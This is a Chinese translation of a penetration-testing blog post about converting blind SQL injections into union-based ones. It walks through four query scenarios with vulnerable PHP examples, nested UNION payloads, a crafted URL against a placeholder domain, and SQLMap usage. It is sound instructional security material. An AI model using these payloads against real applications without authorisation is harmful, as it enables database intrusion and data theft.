# 治愈盲目注射

> 原文：<https://infosecwriteups.com/healing-blind-injections-df30b9e0e06f?source=collection_archive---------1----------------------->

如果我告诉您有一种方法可以治愈盲目的 SQL 注入，并将它们转变为健康的基于联合的注入，会怎么样？

![](img/dfdef988bda94827c1da8708de92a7d0.png)

当易受攻击的查询返回数据时，您是否遇到过盲目的 SQL 注入？

*……再读一遍问题……*

你明白了吗？
我来给你介绍一下**隐藏工会的 SQL 注入**。
想象一下这个场景，在一个 web 应用程序上有一个搜索功能，URL 是这样的:`http://sub.domain.tld/search?query=abcd`通过访问这个 URL，您将看到所有名称中带有字母`abcd`的产品。
经过一点测试，你意识到`query`这个参数容易受到 SQL 注入的攻击。
你给`SQLMap`一个 URL，它确认了 SQLi，但是一个盲注入…
现在让我再问你一个关键问题，易受攻击的查询*返回数据*但是注入是盲注入，这怎么可能呢？？？

*…在你继续之前考虑几分钟……*

**第一部分:场景**
好了，我们来分解一下。
根据我的经验，有四种可能的情况:
(易受攻击的查询以**粗体**显示)

**场景 1:** 易受攻击的查询是父查询的子查询，父查询负责返回数据。

```
SELECT 
  * 
FROM 
  customers 
WHERE 
  id IN (
    **SELECT 
      DISTINCT customer_id 
    FROM 
      orders 
    WHERE 
      cost > 200**
  );//source https://careerkarma.com/blog/sql-subquery/
```

**问题:**向易受攻击的查询添加联合有效负载不会影响返回的数据，因为您修改的是`WHERE`部分，而不是返回数据的实际查询。
**解决方案:**您需要知道正在执行的实际查询，以便相应地调整您的有效负载，这意味着正确地结束括号和/或在需要时添加正确的关键字。

**场景二。易受攻击的查询是一个大而复杂的查询，可能包含别名或变量声明。**

```
SELECT 
  s1.user_id, 
  (
    CASE WHEN s2.user_id IS NOT NULL AND s2.sub_type = '**INJECTION**' THEN 1 ELSE 0 END
  ) AS overlap 
FROM 
  subscriptions AS s1 
  LEFT JOIN subscriptions AS s2 ON s1.user_id != s2.user_id 
  AND s1.start_date <= s2.end_date 
  AND s1.end_date >= s2.start_date 
GROUP BY 
  s1.user_id//source https://codingsight.com/how-to-write-complex-sql-queries/
```

**问题:**在这个场景中，当您在注入的有效负载之后注释原始查询的剩余部分时，您破坏了原始查询的开始部分，因为一些别名变成了`undefined`。
**解决方案:**要解决这个问题，我们需要知道原始查询，在我们的有效载荷的开头放置适当的括号、关键字和别名，以便原始查询的第一部分保持有效。

**场景三。**易受攻击的查询的结果正在第二个查询中使用，并且第二个查询返回数据。

```
<?php// retrieve product ID based on product name
$query1 = "**SELECT 
             id 
           FROM 
             products 
           WHERE 
             name = '$name'**";$result1 = odbc_exec($conn, $query1);// retrieve product's comments based on product ID
$query2 = "**SELECT 
             comments 
           FROM 
             products 
           WHERE 
             id = '$result1'**";$result1 = odbc_exec($conn, $query2);?>//source https://www.php.net/manual/en/security.database.sql-injection.php
```

**问题:**您可以向第一个查询添加一个联合有效负载，但是它不会影响返回的数据，因为第一个查询不负责返回数据，而第二个查询负责。
**解决方案:**将这些盲注入转变为基于联合的注入是有条件的，第二个查询也需要是易受攻击的，并且它的输入没有得到净化。如果是这样，您需要使第一个查询不返回数据，接下来，追加一个联合查询，返回您想要在第二个查询中*注入的有效负载。复杂？举个例子怎么样:
有效负载(我们注入到第一个查询中的内容):*

```
' AND 1 = 2 UNION SELECT "*injection*" -- -
```

*注入*的值是我们想要在*第二个查询*中注入的值:

```
' AND 1=2 UNION SELECT ...
```

最终有效负载(在插入第二个查询的*注入*值之后):

```
' AND 1 = 2 UNION SELECT "***' AND 1=2 UNION SELECT ...***" -- -
                          \________________________/
                                      ||
                                      \/
                               the payload that
                                get's injected
                             into the second query
\________________________________________________________/
                            ||
                            \/
 the actual query we inject into the vulnerable parameter
```

注入后的第一个查询:

```
SELECT               --\
  id                   |
FROM                   |----> first query
  products             |
WHERE                  |
  name = 'abcd**'** --/ **AND 1 = 2** --\ **UNION** |----> injected payload **SELECT** | **"*' AND 1=2 UNION SELECT ... -- -*" -- -**' --/
```

注入后的第二个查询:

```
SELECT            --\
  comments          |
FROM                |----> second query
  products          |
WHERE               |
  id = '**'** --/ **AND 1 = 2** --\ **UNION** |----> injected payload **SELECT ... -- -**'  --/
```

很酷，不是吗？😎😎

场景 4。易受攻击的参数正在几个独立的查询中使用。

```
<?php//retriveing product details based on product ID
$query1 = "**SELECT 
             name, 
             inserted, 
             size 
           FROM 
             products 
           WHERE 
             id = '$id'**";$result1 = odbc_exec($conn, $query1);//retriveing product's comments based on product ID, independently
$query2 = "**SELECT 
             comments 
           FROM 
             products 
           WHERE 
             id = '$id'**";$result2 = odbc_exec($conn, $query2);?>//source https://www.php.net/manual/en/security.database.sql-injection.php
```

**问题:**虽然您可以在其中一个查询中附加一个联合查询并保持有效，但它可能会破坏另一个查询，服务器会返回 500 错误，而不是您想要的数据。
**解决方法:**这确实要看情况，但第一步还是一如既往的了解原查询。通常，在第一步，这些类型的注入只是基于时间的，因为延迟有效负载被插入到多个查询中，并且您的延迟时间被乘以一个数字。
这个事实在提取数据时混淆了`SQLMap`,打乱了输出。这意味着`SQLMap`错误地识别了查询输出的字符。在一次测试中，我执行了十次查询，手动地构建了正确的输出。我比较了不同的输出，确定了重复的字符(很可能是正确的)，并猜测了其中的一些。

**PRO TIP**
这些*隐藏的基于联合的注入*之一存在的标志是:
当你可以使用`ORDER BY`技术来确认漏洞时，却以一个布尔或基于时间的结束。
那就当`SQLMap`说:
`'ORDER BY' technique appeares to be usable.`
`vulnerable query seems to have N columns.`
但是到最后就糊涂了，报了个瞎注:)

所以…明白了吗？
现在您可能已经意识到，要将基于布尔或基于时间的注入转换为基于联合的注入(当然，如果查询返回数据的话)，我们需要知道正在后端执行的查询。
这就是为什么当我遇到盲注的时候，
我做的第一件事就是提取正在执行的查询，而不是像新手一样转储`users`表。😒

但是怎么做呢？
几乎所有广泛使用的 DBMSes 都有一个默认的表，其中存储着当前正在执行的查询。要找到该表，您需要阅读目标 DBMS 的文档。

**PRO 提示**
`SQLMap`的`--statement`标志会自动为您完成这项工作，独立于后端 DBMS。

但是我仍然鼓励你阅读文档，因为在某些情况下你需要手动完成，而`SQLMap`帮不上忙。

**第二部分:自动化** 如何使用`SQLMap`实现这些注射的自动化？

上述所有场景中的普遍问题是，我们需要安全地关闭原始查询，然后向其追加一个联合查询，这是`SQLMap`无法自动完成的。
所以我们需要手动执行，我们首先将用于关闭原始查询的合适负载添加到易受攻击参数的值中，然后使用星号( ***** )告诉`SQLMap`从哪里开始注入。这种方式`SQLMap`将利用正常的基于联合的注入。让我给你举个例子:

考虑第三种情况。
我们假设 DMBS 是`mysql`，第一个和第二个查询只返回一列。如果我们想要提取数据库的版本，这将是我们的有效负载:

```
' AND 1=2 UNION SELECT " **' AND 1=2 UNION SELECT @@version -- -**" -- -
```

所以 URL 应该是这样的:

```
http://sub.domain.tld/search?query=abcd'+AND+1=2+UNION+SELECT+"+**'AND 1=2+UNION+SELECT+@@version**+--+-"+--+-
```

对于自动化，这将是`SQLMap`的输入:

```
http://sub.domain.tld/search?query=abcd'AND 1=2 UNION SELECT "*****"-- -
```

注意标记`SQLMap`注入点的星号

有帮助吗？
我不要求你给我买杯咖啡，
教我点什么…
不和:`**REDN#9702**`

Infosec Writeups 团队刚刚完成了我们的第一次虚拟网络安全会议和网络活动。我们有 16 位出色的演讲者，他们主持了非常有价值和鼓舞人心的会议。要查看演讲者和主题列表，请点击此处。

[](https://iwcon.live/) [## IWCon2022 — Infosec 书面报告虚拟会议

### 与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…

iwcon.live](https://iwcon.live/)